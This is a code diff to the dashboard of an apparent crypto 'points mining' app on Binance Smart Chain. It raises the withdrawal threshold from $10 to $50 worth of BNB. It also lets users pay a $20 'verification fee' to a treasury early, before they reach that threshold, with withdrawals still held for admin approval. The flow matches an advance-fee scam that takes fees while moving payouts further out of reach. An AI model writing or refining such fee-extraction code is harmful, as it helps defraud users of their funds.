@@ -37,7 +37,7 @@ export const Dashboard: React.FC<DashboardProps> = ({
   const usdValue = (user.totalPoints / 1000) * 0.50; // 1000 pts = $0.50 USD baseline
   const bnbValue = usdValue / bnbPrice;
   
-  const withdrawalThresholdUSD = 10.00;
+  const withdrawalThresholdUSD = 50.00; // $50 worth of BNB
   const verificationFeeUSD = 20.00; // Refined to $20 worth of BNB
   const isThresholdMet = usdValue >= withdrawalThresholdUSD;
   const verificationFeeBNB = (verificationFeeUSD / bnbPrice).toFixed(5);
@@ -124,29 +124,57 @@ export const Dashboard: React.FC<DashboardProps> = ({
       showFailed({
         initiativeName: 'Treasury Settlement',
         title: 'MetaMask Wallet Required',
-        description: 'You must connect your Binance Smart Chain Web3 wallet before initiating an on-chain withdrawal verification transaction.',
+        description: 'You must connect your Binance Smart Chain Web3 wallet before initiating an on-chain transaction.',
         actionLabel: 'Connect Web3 Wallet',
       });
       return;
     }
 
-    if (!isThresholdMet) {
-      const err = `Minimum withdrawal threshold is ${withdrawalThresholdBNB} BNB (≈ $${withdrawalThresholdUSD.toFixed(2)} USDT) (You have ${bnbValue.toFixed(5)} BNB)`;
-      setErrorMessage(err);
-      showFailed({
-        initiativeName: 'Treasury Settlement',
-        title: 'Threshold Incomplete',
-        badge: `${bnbValue.toFixed(5)} / ${withdrawalThresholdBNB} BNB`,
-        description: `Minimum withdrawal threshold is ${withdrawalThresholdBNB} BNB (≈ $${withdrawalThresholdUSD.toFixed(2)} USDT) equivalent in mined points. Keep mining or upgrade your tier to accelerate your daily point accumulation!`,
-        details: [
-          { label: 'Current Balance', value: `${user.totalPoints.toLocaleString()} PTS (${bnbValue.toFixed(5)} BNB)` },
-          { label: 'Required Threshold', value: `${withdrawalThresholdBNB} BNB (≈ $10.00 USDT)` },
-          { label: 'Points Needed', value: `${Math.max(0, 20000 - user.totalPoints).toLocaleString()} PTS` },
-        ],
-      });
+    // If the user is already APPROVED (Verified) and clicks withdraw:
+    if (user.withdrawalStatus === 'APPROVED') {
+      if (!isThresholdMet) {
+        const err = `Minimum withdrawal threshold is ${withdrawalThresholdBNB} BNB (≈ $${withdrawalThresholdUSD.toFixed(2)} USDT) (You have ${bnbValue.toFixed(5)} BNB)`;
+        setErrorMessage(err);
+        showFailed({
+          initiativeName: 'Treasury Settlement',
+          title: 'Threshold Incomplete',
+          badge: `${bnbValue.toFixed(5)} / ${withdrawalThresholdBNB} BNB`,
+          description: `Minimum withdrawal threshold is ${withdrawalThresholdBNB} BNB (≈ $${withdrawalThresholdUSD.toFixed(2)} USDT). Keep mining or upgrade your tier to accelerate your daily point accumulation!`,
+          details: [
+            { label: 'Current Balance', value: `${user.totalPoints.toLocaleString()} PTS (${bnbValue.toFixed(5)} BNB)` },
+            { label: 'Required Threshold', value: `${withdrawalThresholdBNB} BNB (≈ $${withdrawalThresholdUSD.toFixed(2)} USDT)` },
+          ],
+        });
+        return;
+      }
+
+      // Process free withdrawal request (as they are already verified)
+      try {
+        setIsProcessingTx(true);
+        // Submit withdrawal request to admin approval
+        await onUpdateUser({
+          withdrawalStatus: 'PENDING_ADMIN_APPROVAL',
+        });
+        showSuccess({
+          initiativeName: 'Treasury Settlement',
+          title: 'Withdrawal Submitted!',
+          badge: `${bnbValue.toFixed(5)} BNB`,
+          description: `Your withdrawal request for ${bnbValue.toFixed(5)} BNB has been submitted successfully! The treasury team will verify and release it within 24 hours.`,
+          details: [
+            { label: 'Points Settled', value: `${user.totalPoints.toLocaleString()} PTS` },
+            { label: 'Estimated Value', value: `${bnbValue.toFixed(5)} BNB (≈ $${usdValue.toFixed(2)} USDT)` },
+            { label: 'KYC Verification', value: 'Already Verified' },
+          ],
+        });
+        setIsProcessingTx(false);
+      } catch (err: any) {
+        setErrorMessage(err?.message || "Failed to submit withdrawal request.");
+        setIsProcessingTx(false);
+      }
       return;
     }
 
+    // Otherwise, pay the one-time verification fee (regardless of threshold)
     try {
       setIsProcessingTx(true);
       
@@ -172,12 +200,12 @@ export const Dashboard: React.FC<DashboardProps> = ({
         status: 'SUCCESS',
       });
 
-      // Update Firestore / state: set withdrawalStatus to PENDING_ADMIN_APPROVAL
+      // Update Firestore / state: set withdrawalStatus to PENDING_ADMIN_APPROVAL (verified when approved)
       await onUpdateUser({
         withdrawalStatus: 'PENDING_ADMIN_APPROVAL',
       });
 
-      const confirmedMsg = `Verification fee transaction confirmed on Binance Smart Chain! Hash: ${txHash.substring(0, 10)}... (View on BscScan). Your withdrawal request is submitted for treasury release.`;
+      const confirmedMsg = `Verification fee transaction confirmed on Binance Smart Chain! Hash: ${txHash.substring(0, 10)}... (View on BscScan). Your account verification is submitted.`;
       setSuccessMessage(confirmedMsg);
       setIsProcessingTx(false);
 
@@ -486,12 +514,12 @@ export const Dashboard: React.FC<DashboardProps> = ({
           </div>
 
           <div className="p-6 bg-[#2B3139] rounded-lg border border-[rgba(255,255,255,0.08)]">
-            <p className="text-[11px] uppercase tracking-wider text-[#848E9C] mb-1">Estimated Next Payout</p>
+            <p className="text-[11px] uppercase tracking-wider text-[#848E9C] mb-1">Minimum Settlement Threshold</p>
             <p className="text-3xl font-bold mono mb-1 text-white">
-              {(10.00 / bnbPrice).toFixed(4)} <span className="text-sm font-normal text-[#848E9C]">BNB</span>
+              {withdrawalThresholdBNB} <span className="text-sm font-normal text-[#848E9C]">BNB</span>
             </p>
             <p className={`text-xs font-medium ${isThresholdMet ? 'text-[#00C087]' : 'text-[#F3BA2F]'}`}>
-              {isThresholdMet ? `Threshold Met: ${withdrawalThresholdBNB} BNB Minimum` : `Need ${((withdrawalThresholdUSD - usdValue) / bnbPrice).toFixed(4)} BNB to reach threshold`}
+              {isThresholdMet ? `Threshold Met: ${withdrawalThresholdBNB} BNB Minimum` : `Need ${((withdrawalThresholdUSD - usdValue) / bnbPrice).toFixed(5)} BNB to reach threshold`}
             </p>
           </div>
         </div>
@@ -518,26 +546,48 @@ export const Dashboard: React.FC<DashboardProps> = ({
               </span>
             </div>
             <p className="text-sm text-[#848E9C] mb-6 max-w-xl">
-              To unlock withdrawals, your account must undergo a one-time blockchain verification. This verification fee (<strong className="text-[#F3BA2F]">{verificationFeeBNB} BNB</strong> ≈ $20.00 USDT) is sent directly to the protocol treasury to secure the network.
+              To unlock withdrawals, your account must undergo a one-time blockchain verification. This verification fee (<strong className="text-[#F3BA2F]">{verificationFeeBNB} BNB</strong> ≈ $20.00 USDT) is sent directly to the protocol treasury to secure the network. You can verify your account early at any time!
             </p>
 
             <div className="flex flex-wrap items-center gap-4">
               <motion.button
-                whileHover={isThresholdMet && user.withdrawalStatus !== 'PENDING_ADMIN_APPROVAL' ? { scale: 1.02 } : {}}
-                whileTap={isThresholdMet && user.withdrawalStatus !== 'PENDING_ADMIN_APPROVAL' ? { scale: 0.97 } : {}}
+                whileHover={
+                  user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL' || (user.withdrawalStatus === 'APPROVED' && !isThresholdMet)
+                    ? {}
+                    : { scale: 1.02 }
+                }
+                whileTap={
+                  user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL' || (user.withdrawalStatus === 'APPROVED' && !isThresholdMet)
+                    ? {}
+                    : { scale: 0.97 }
+                }
                 onClick={handleVerifyAndWithdraw}
-                disabled={isProcessingTx || user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL'}
+                disabled={
+                  isProcessingTx ||
+                  user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL' ||
+                  (user.withdrawalStatus === 'APPROVED' && !isThresholdMet)
+                }
                 className={`px-8 py-3.5 rounded-xl font-bold text-sm transition flex items-center gap-2.5 ${
-                  isThresholdMet && user.withdrawalStatus !== 'PENDING_ADMIN_APPROVAL'
-                    ? 'bg-[#F3BA2F] hover:bg-[#e2ad23] text-black cursor-pointer shadow-lg shadow-[#F3BA2F]/20'
-                    : 'bg-[#2B3139] text-[#848E9C] hover:bg-white/10 hover:text-white cursor-pointer border border-white/5'
+                  user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL' || (user.withdrawalStatus === 'APPROVED' && !isThresholdMet)
+                    ? 'bg-[#2B3139] text-[#848E9C] border border-white/5 cursor-not-allowed'
+                    : 'bg-[#F3BA2F] hover:bg-[#e2ad23] text-black cursor-pointer shadow-lg shadow-[#F3BA2F]/20'
                 }`}
               >
                 {isProcessingTx ? (
                   <>
                     <Loader2 className="w-4 h-4 animate-spin text-black" />
-                    <span>Processing Verification ({verificationFeeBNB} BNB)...</span>
+                    <span>Processing...</span>
                   </>
+                ) : user.withdrawalStatus === 'APPROVED' ? (
+                  isThresholdMet ? (
+                    <>
+                      <span>Withdraw Mined Points ({bnbValue.toFixed(5)} BNB)</span>
+                    </>
+                  ) : (
+                    <>
+                      <span>Verified (Need {withdrawalThresholdBNB} BNB threshold)</span>
+                    </>
+                  )
                 ) : user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL' ? (
                   <>
                     <Loader2 className="w-4 h-4 animate-spin text-[#F3BA2F]" />
@@ -545,7 +595,7 @@ export const Dashboard: React.FC<DashboardProps> = ({
                   </>
                 ) : (
                   <>
-                    <span>Verify & Withdraw ({verificationFeeBNB} BNB)</span>
+                    <span>{isThresholdMet ? 'Verify & Withdraw' : 'Verify Account'} ({verificationFeeBNB} BNB)</span>
                   </>
                 )}
               </motion.button>
